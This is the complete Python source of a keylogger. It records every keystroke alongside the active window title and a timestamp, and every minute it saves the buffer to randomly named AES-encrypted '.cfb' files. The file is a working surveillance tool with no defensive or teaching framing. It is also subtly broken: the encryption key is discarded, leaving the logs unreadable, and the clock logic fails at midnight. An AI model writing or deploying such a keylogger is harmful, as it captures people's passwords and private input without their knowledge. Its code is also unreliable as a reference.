from pynput import keyboard
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import pygetwindow as gw
import datetime, random

prevWindow = ''

def currentTime():
    time = datetime.datetime.now()
    h = time.hour
    m = time.minute
    if h < 10: h='0'+str(h)
    if m < 10: m='0'+str(m)
    return str(h) + ":" + str(m)

def futureTime(interval):
    tmp = currentTime()
    h,m = tmp.split(':')
    h = int(h)
    m = int(m)
    m += interval
    if m >= 60: 
        h+=1
        m=m%60
    if h < 10: h='0'+str(h)
    if m < 10: m='0'+str(m)
    return str(h) + ":" + str(m)

def isFlagged(futureTime):
    tmp = currentTime()
    tmpH, tmpM = tmp.split(':')
    futureH, futureM = futureTime.split(':')
    tmpH = int(tmpH)
    tmpM = int(tmpM)
    futureH = int(futureH)
    futureM = int(futureM)
    if tmpH > futureH:
        return True
    elif tmpH==futureH and tmpM >= futureM:
        return True
    else:
        return False
    
def genTitle():
    dict = 'abcdefghijklmnopqrstuvwxy0123456789'
    tmp = ''
    for i in range(10):
        tmp += random.choice(dict)
    tmp += '.cfb'
    return tmp
    
def save(data):
    title = genTitle()
    encoded,key,iv = encryptAES(data.encode())
    with open(title, 'wb') as file:
        file.write(encoded)
    file.close()
    
def encryptAES(data):
    paddedData = pad(data, 16)
    key = get_random_bytes(16)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(paddedData)
    return ciphertext,key,iv

future = futureTime(1)
memory = ""

def onPress(key):
    global prevWindow, future, memory
    current = gw.getActiveWindowTitle()
    check = isFlagged(future)
    if prevWindow != current:
        print(f"{current} :: {currentTime()} ::")
        memory += f"{current} :: {currentTime()} ::\n"
        try:
            print(f"{key.char}")
            memory+=f"{key.char}\n"
        except AttributeError:
            print(f"{key}")
            memory+=f"{key}\n"
        prevWindow = current
    else:
        try:
            print(f"{key.char}")
            memory+=f"{key.char}\n"
        except AttributeError:
            print(f"{key}")
            memory+=f"{key}\n"
            
    if check:
        save(memory)
        future = futureTime(1)
        memory = ""
        
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=onPress) as listener:
    listener.join()